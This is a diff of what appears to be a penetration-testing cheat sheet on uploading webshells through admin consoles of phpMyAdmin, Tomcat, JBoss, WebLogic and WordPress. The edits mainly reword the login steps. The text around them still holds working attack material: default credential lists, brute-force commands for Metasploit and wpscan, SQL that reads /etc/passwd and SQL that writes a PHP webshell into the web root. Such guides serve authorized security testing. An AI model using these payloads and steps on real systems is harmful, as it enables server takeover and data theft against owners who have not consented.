@@ -21,21 +21,18 @@
 ```
 ##### Example 1 - PHPMyAdmin Web console
 ```
-➤ Step 1. Log into the PHPMyAdmin Web console (e.g., http://x.x.x.x/phpmyadmin or http://x.x.x.x/website-name/phpmyadmin)
-          - Default credentials i.e. login 'root' with an empty password
-          - Weak password: root:root, ...
-          - Anonymous access
-  
+➤ Step 1. Log into the PHPMyAdmin Web console by exploiting the presence of default or easy guessable credentials,
+	  anonymous access or by performing a brute-force or dictionnary password attack using Burp proxy
+          - URL: http://x.x.x.x/phpmyadmin or http://x.x.x.x/website-name/phpmyadmin)
+
 ➤ Step 2. Find or guess the Web server installation path (DocumenRoot) Web root folder (e.g., it can be found thanks to "http://x.x.x.x/<path>/phpinfo.php").
           - Example for Windows - XAMP = 'C:\XAMPP\htdocs\' or 'C:\XAMPP\htdocs\<website-name>\'
           - Example for Linux   - LAMP = '/var/www/' or '/var/www/https/<website-name>/wp-content/uploads/', etc ... 
   
 ➤ Step 3. In the PHPMyAdmin Web console,  go to the SQL query browser then:
-
           - Type and execute the following SQL query to display OS files (it depends of the right of the account running the PHPMyAdmin console)
             + Linux server   - "SELECT LOAD_FILE('/etc/passwd');"
             + Windows server - "SELECT LOAD_FILE('C:\Windows\system.ini');"
-  
           - Type and execute the following SQL query to write a PHP Webshell in the Web root folder
             + Linux server   - "select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/b<website-name>/wp-content/uploads/Webshell.php";"
             + Windows server - "select "< ? $c = $_GET['cmd']; $op = shell_exec($c); echo $op ? >" into outfile "C:\\XAMPP\\htdocs\\<website-name>\\Webshell.php";"
@@ -48,9 +45,9 @@
 
 ##### Example 2 - Apache Tomcat Manager Web console
 ```
-➤ Step 1. Log into the Tomcat manager Web console (e.g., http://x.x.x.x/:8080/manager/html or http://x.x.x.x/website-name/manager, ...)
-          - Default or weak credentials such as tomcat:tomcat, tomcat:manager, manager:manager, admin:manager, xampp:xampp, ...
-          - Password bruteforce attack with Metasploit (use auxiliary/scanner/http/tomcat_mgr_login)
+➤ Step 1. Log into the Tomcat manager Web console by exploiting the presence of default or easy guessable credentials,
+	  anonymous access or by performing a brute-force or dictionnary password attack using Burp proxy or Metasploit (use auxiliary/scanner/http/tomcat_mgr_login)
+	  - URL: http://x.x.x.x/:8080/manager/html or http://x.x.x.x/website-name/manager, ...)
   
 ➤ Step 2. Upload and deploy your WAR file 
           (i.e. "Select WAR file to upload" and then click on the "Deploy" button)
@@ -104,8 +101,6 @@
 
 ##### Example 3 - JBoss Administration JMX console
 Notes:
-- JBoss Application Server (or JBoss AS) is a free software/open-source Java EE-based application server.
-- Because it is Java-based, the JBoss application server operates cross-platform: usable on any operating system that supports Java.
 - JBOSS default installation is not secure at all, there are few administrative interfaces that can be accessed without any authentication 
   or withe the default credentials admin:admin:
   > jmx-console,
@@ -142,8 +137,9 @@ Other manual Webshell upload technique: https://securitysynapse.blogspot.com/201
 
 ##### Example 4 - Weblogic Administration console
 ```
-➤ Step 1. Log into the Weblogic admin console
-          - URL should be somethibg like: "http:\\<Admin_server_IP>:<AdminServerPort>/console" or "https:\\x.x.x.x:7001/console", ...
+➤ Step 1. Log into the Weblogic admin console by exploiting the presence of default or easy guessable credentials,
+	  anonymous access or by performing a brute-force or dictionnary password attack using Burp proxy 
+          - URL should be something like: "http:\\<Admin_server_IP>:<AdminServerPort>/console" or "https:\\x.x.x.x:7001/console", ...
           - Common default or weak credentials: weblogic:weblogic, weblogic/weblogic1, weblogic/welcome1, system/Passw0rd (for Weblogic Server 11g), system/password, system/weblogic, ...
   
 ➤ Step 2. From the tree-structure in the left panel, choose the Web Applications node under the Deployments node. 
@@ -179,7 +175,7 @@ Example 1 - WorPress
 ➤ Step 1. Enumerate WordPress users or Guess the Wordpress admin's login  
           - root@kali:~/# wpscan --url http://x.x.x.x.x --enumerate p,u,t,tt)
   
-➤ Step 2. Password bruteforce 
+➤ Step 2. Perform a bruteforce or dictionnary password attack 
           - root@kali:~/# wpscan --url http://x.x.x.x.x --wp-content-dir /wp-login.php --wordlist /root/Desktop/<path>/wordlist.dic --username admin
   
 ➤ Step 3. Log into the WorPress admin console 
